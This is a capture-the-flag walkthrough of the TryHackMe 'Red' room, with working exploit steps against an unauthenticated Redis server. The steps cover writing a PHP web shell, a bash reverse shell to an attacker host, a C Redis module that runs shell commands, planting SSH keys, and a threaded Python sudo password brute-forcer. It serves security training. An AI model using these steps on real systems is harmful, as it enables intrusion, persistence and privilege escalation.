# Red

A classic battle for the ages.

he match has started, and Red has taken the lead on you.
But you are Blue, and only you can take Red down.

However, Red has implemented some defense mechanisms that will make the battle a bit difficult:
1. Red has been known to kick adversaries out of the machine. Is there a way around it?
2. Red likes to change adversaries' passwords but tends to keep them relatively the same. 
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!

This is a unique battle, and if you feel up to the challenge. Then by all means go for it!
Whenever you are ready, click on the Start Machine button to fire up the Virtual Machine.

Room: https://tryhackme.com/room/redisl33t

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/redisl33t.md

---

## Note
Checking walthroughs after, our instance was partly broken. The intended SUID `xxd` step was missing because `/usr/bin/xxd` was not SUID. We worked around this by using Redis module execution to create `/home/vianka/.ssh`, SSHing in as `vianka`, and then confirming the local password by brute forcing/testing `sudo`.

---

## 1. Enumeration

Nmap found three open services:

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp   open  http    Apache httpd 2.4.41
6379/tcp open  redis   Redis key-value store 6.0.7
```

The Redis service was reachable without authentication:

```bash
redis-cli -h TARGET_IP -p 6379
```

Inside Redis:

```redis
INFO server
```

Output confirmed:

```text
redis_version:6.0.7
tcp_port:6379
executable:/home/vianka/redis-stable/src/redis-server
config_file:/home/vianka/redis-stable/redis.conf
```

Useful Redis config checks:

```redis
CONFIG GET dir
CONFIG GET dbfilename
CONFIG GET protected-mode
CONFIG GET requirepass
```

We confirmed:

```text
protected-mode: no
requirepass: empty
```

This meant Redis was exposed and unauthenticated.

---

## 2. Write a PHP web shell using Redis

Because Apache was running on port 80, we tested whether Redis could write into the web root.

In Redis:

```redis
CONFIG SET dir /var/www/html
CONFIG SET dbfilename test.php
SET shell "<?php system($_GET['cmd']); ?>"
SAVE
```

Then from the AttackBox:

```bash
curl 'http://TARGET_IP/test.php?cmd=id'
```

This returned command output as `www-data`.

---

## 3. Get a reverse shell as www-data

Start a listener:

```bash
nc -lvnp 4446
```

Trigger the PHP web shell:

```bash
curl 'http://TARGET_IP/test.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ATTACKBOX_IP/4446%200%3E%261%27'
```

We landed as:

```text
www-data
```

TTY upgrade:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 120
```

---

## 4. Initial checks as www-data

We checked the home directory and Redis source tree:

```bash
ls -la /home/vianka
ls -la /home/vianka/redis-stable/src/redismodule.h
```

The Redis module header existed and was readable:

```text
-rw-rw-r-- 1 vianka vianka 56935 Aug 31  2020 /home/vianka/redis-stable/src/redismodule.h
```

This mattered because Metasploit’s Redis module exploit failed to load its generated module, but we could compile our own module directly on the target.

---

## 5. Metasploit Redis module attempt

We tried:

```text
use exploit/linux/redis/redis_replication_cmd_exec
set RHOSTS TARGET_IP
set RPORT 6379
set SRVHOST ATTACKBOX_IP
set SRVPORT 8888
set LHOST ATTACKBOX_IP
set LPORT 4445
set PAYLOAD linux/x64/shell/reverse_tcp
set VERBOSE true
run
```

The replication stage worked, but module loading failed:

```text
Redis command 'SLAVEOF ATTACKBOX_IP 8888' got '+OK'
Redis command 'CONFIG SET dbfilename xator.so' got '+OK'
Accepted a connection
No response to 'MODULE LOAD ./xator.so'
ERR Error loading the extension. Please check the server logs.
Redis command 'upqrymr.nsqcypz' got '-ERR unknown command'
```

Conclusion:

```text
Replication worked.
The .so was transferred.
MODULE LOAD failed.
No session was expected until the module load problem was solved.
```

This is likely a compile/runtime mismatch between the generated Metasploit shared object and the target.

---

## 6. Build a Redis module on the target

We first proved basic module loading worked with a tiny harmless module.

Create `/tmp/min.c`:

```c
#include "/home/vianka/redis-stable/src/redismodule.h"

int PingCmd(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    RedisModule_ReplyWithSimpleString(ctx, "pong");
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "min", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "min.ping", PingCmd, "readonly", 0, 0, 0) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK;
}
```

Compile and load:

```bash
gcc -fPIC -shared -o /var/www/html/min.so /tmp/min.c
chmod 755 /var/www/html/min.so
redis-cli -h TARGET_IP -p 6379 MODULE LOAD /var/www/html/min.so
redis-cli -h TARGET_IP -p 6379 min.ping
```

Result:

```text
OK
pong
```

That proved Redis module loading worked.

---

## 7. Build a command execution Redis module

Create `/tmp/cmdmod.c`:

```c
#include "/home/vianka/redis-stable/src/redismodule.h"
#include <stdlib.h>

int ExecCmd(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) {
        return RedisModule_WrongArity(ctx);
    }

    size_t len;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &len);

    char buf[4096];
    if (len >= sizeof(buf)) {
        RedisModule_ReplyWithError(ctx, "command too long");
        return REDISMODULE_OK;
    }

    for (size_t i = 0; i < len; i++) {
        buf[i] = cmd[i];
    }
    buf[len] = 0;

    int rc = system(buf);
    RedisModule_ReplyWithLongLong(ctx, rc);
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "cmdmod", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }

    if (RedisModule_CreateCommand(ctx, "cmdmod.exec", ExecCmd, "write", 0, 0, 0) == REDISMODULE_ERR) {
        return REDISMODULE_ERR;
    }

    return REDISMODULE_OK;
}
```

Compile:

```bash
gcc -fPIC -shared -o /var/www/html/cmdmod.so /tmp/cmdmod.c
chmod 755 /var/www/html/cmdmod.so
```

Load:

```bash
redis-cli -h TARGET_IP -p 6379 MODULE LOAD /var/www/html/cmdmod.so
```

Test execution:

```bash
redis-cli -h TARGET_IP -p 6379 cmdmod.exec "id > /var/www/html/redis_id.txt"
cat /var/www/html/redis_id.txt
```

---

## 8. Create vianka SSH access

Redis alone cannot create directories with `CONFIG SET dir`. It can only write files into existing directories. Earlier, this failed because `.ssh` did not exist:

```redis
CONFIG SET dir /home/vianka/.ssh
```

Output:

```text
ERR Changing directory: No such file or directory
```

With the custom Redis module loaded, we used command execution as the Redis user to create it:

```bash
redis-cli -h TARGET_IP -p 6379 cmdmod.exec "mkdir -p /home/vianka/.ssh"
redis-cli -h TARGET_IP -p 6379 cmdmod.exec "chmod 700 /home/vianka/.ssh"
```

Generate an SSH key on the AttackBox:

```bash
ssh-keygen -t rsa -b 4096 -f redis_key
```

Write the public key into `authorized_keys` using Redis:

```bash
redis-cli -h TARGET_IP -p 6379 CONFIG SET dir /home/vianka/.ssh
redis-cli -h TARGET_IP -p 6379 CONFIG SET dbfilename authorized_keys
redis-cli -h TARGET_IP -p 6379 SET key "$(printf '\n\n'; cat redis_key.pub; printf '\n\n')"
redis-cli -h TARGET_IP -p 6379 SAVE
```

SSH in:

```bash
chmod 600 redis_key
ssh -i redis_key vianka@TARGET_IP
```

We were now logged in as:

```text
vianka
```

---

## 9. Intended privilege escalation check

Public Res walkthroughs show the intended privilege escalation is SUID `xxd`.

We checked:

```bash
ls -la /usr/bin/xxd
```

Our output:

```text
-rwxr-xr-x 1 root root 18712 Apr  2  2025 /usr/bin/xxd
```

This is not SUID. The intended vulnerable mode would look like:

```text
-rwsr-xr-x 1 root root ...
```

We also checked for other copies:

```bash
find / -name xxd -type f -exec ls -la {} \; 2>/dev/null
```

Output:

```text
-rwxr-xr-x 1 root root 18712 Apr  2  2025 /usr/bin/xxd
-rw-r--r-- 1 root root 467 Feb  1  2020 /usr/share/bash-completion/completions/xxd
```

So the intended `xxd` path was broken on this instance.

The `.bash_history` still showed the original intended clue:

```bash
sudo chmod u+s /usr/bin/xxd
```

But the actual binary no longer had SUID set.

---

## 10. Confirm capabilities and rule out easy alternatives

Capabilities:

```bash
getcap -r / 2>/dev/null
```

Output:

```text
/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Nothing obvious there.

We also checked the Redis service and config:

```bash
ls -la /etc/systemd/system/redis.service
ls -la /home/vianka/redis-stable/redis.conf
```

Output:

```text
-rw-r--r-- 1 root root 304 Sep  2  2020 /etc/systemd/system/redis.service
-rw-rw-r-- 1 vianka vianka 84643 Sep  2  2020 /home/vianka/redis-stable/redis.conf
```

The config was writable by `vianka`, but the service file was root-owned. This did not directly give root.

---

## 11. Broken-room workaround: brute force the vianka password on the box

We copied `rockyou.txt` to the target. If it was compressed as a tar gzip archive, extract it with:

```bash
tar -xzf rockyou.txt.tar.gz
```

Check that the wordlist exists:

```bash
ls -lh rockyou.txt
wc -l rockyou.txt
```

The first brute force attempt used a Python script with `pexpect`, but the target did not have `pexpect` installed:

```text
ModuleNotFoundError: No module named 'pexpect'
```

To work around that, we copied the Python modules from the AttackBox.

On the AttackBox, locate the install path:

```bash
python3 -m pip show pexpect
python3 -m pip show ptyprocess
```

In our case, `pexpect` was installed under:

```text
/usr/lib/python3/dist-packages
```

Package the dependencies:

```bash
cd /usr/lib/python3/dist-packages
tar -czf /tmp/pexpect_deps.tar.gz pexpect pexpect-4.6.0.egg-info ptyprocess ptyprocess-*.egg-info 2>/dev/null
```

Host the archive:

```bash
cd /tmp
python3 -m http.server 8000
```

On the target:

```bash
cd /tmp
wget http://ATTACKBOX_IP:8000/pexpect_deps.tar.gz
mkdir -p pydeps
tar -xzf pexpect_deps.tar.gz -C pydeps
```

Then run scripts with:

```bash
PYTHONPATH=/tmp/pydeps python3 brute.py -u vianka -w rockyou.txt -t 8
```

Final working `sudo` brute force script:

```python
#!/usr/bin/env python3
import argparse
import subprocess
import threading
import queue
import sys
import time

found = threading.Event()
print_lock = threading.Lock()
counter_lock = threading.Lock()
counter = 0

def try_password(password):
    cmd = ["sudo", "-S", "-k", "-p", "", "whoami"]

    try:
        p = subprocess.run(
            cmd,
            input=password + "\n",
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=5
        )

        output = p.stdout.strip()

        if p.returncode == 0 and output == "root":
            return True

    except subprocess.TimeoutExpired:
        return False

    return False

def worker(q):
    global counter

    while not found.is_set():
        try:
            password = q.get_nowait()
        except queue.Empty:
            return

        password = password.rstrip("\r\n")

        if not password:
            q.task_done()
            continue

        with counter_lock:
            counter += 1
            if counter % 100 == 0:
                with print_lock:
                    print(f"[*] Tried {counter} passwords, latest: {password}", flush=True)

        if try_password(password):
            with print_lock:
                print()
                print(f"[+] Found password: {password}")
                print()

            found.set()

        q.task_done()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-w", default="rockyou.txt", help="Wordlist file")
    parser.add_argument("-t", type=int, default=4, help="Number of threads")
    args = parser.parse_args()

    q = queue.Queue()

    with open(args.w, "r", encoding="latin1", errors="ignore") as f:
        for line in f:
            q.put(line)

    print(f"[*] Loaded {q.qsize()} passwords")
    print(f"[*] Starting {args.t} threads")
    print("[*] Progress prints every 100 attempts")
    print()

    threads = []

    for _ in range(args.t):
        t = threading.Thread(target=worker, args=(q,))
        t.daemon = True
        threads.append(t)
        t.start()

    while any(t.is_alive() for t in threads):
        if found.is_set():
            break
        time.sleep(0.2)

    if not found.is_set():
        print("[-] Password not found")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

A smaller test list can be used first:

```bash
head -n 2000 rockyou.txt > test2k.txt
python3 brute_sudo.py -w test2k.txt -t 4
```

The password was in `rockyou.txt`:

```bash
grep -nFx 'beautiful1' rockyou.txt
```

Output:

```text
1150:beautiful1
```

We confirmed the password with sudo:

```bash
sudo -k
printf 'beautiful1\n' | sudo -S -p '' whoami
```

Output:

```text
root
```

Therefore the local user account password was:

```text
beautiful1
```

---

## 12. Root

Become root:

```bash
sudo -s
```

Confirm:

```bash
whoami
id
```

Read the root flag:

```bash
cat /root/root.txt
```

Flag should be redacted in public notes:

```text
THM{REDACTED}
```

---

## Summary

Final path used in our run:

```text
Nmap finds SSH, HTTP, Redis
Redis has no auth
Redis writes PHP web shell to /var/www/html
Web shell gives www-data
Metasploit Redis replication exploit transfers module but MODULE LOAD fails
Manual harmless Redis module proves module loading works
Manual cmdmod Redis module gives command execution as Redis user
Use Redis command execution to create /home/vianka/.ssh
Use Redis arbitrary file write to add authorized_keys
SSH as vianka
Intended SUID xxd path is broken
Move rockyou.txt and Python dependencies to the target
Build a local brute force script for sudo
Find and confirm vianka password beautiful1
sudo -s to root
```

Intended public path:

```text
Redis web shell
www-data
SUID xxd reads /etc/shadow
Crack vianka password with rockyou
su vianka
sudo root
```

Why our route differs:

```text
/usr/bin/xxd was not SUID on our machine.
The room appears to have drifted from the original intended state.
We used Redis module execution to reach vianka and a password workaround to finish.
```
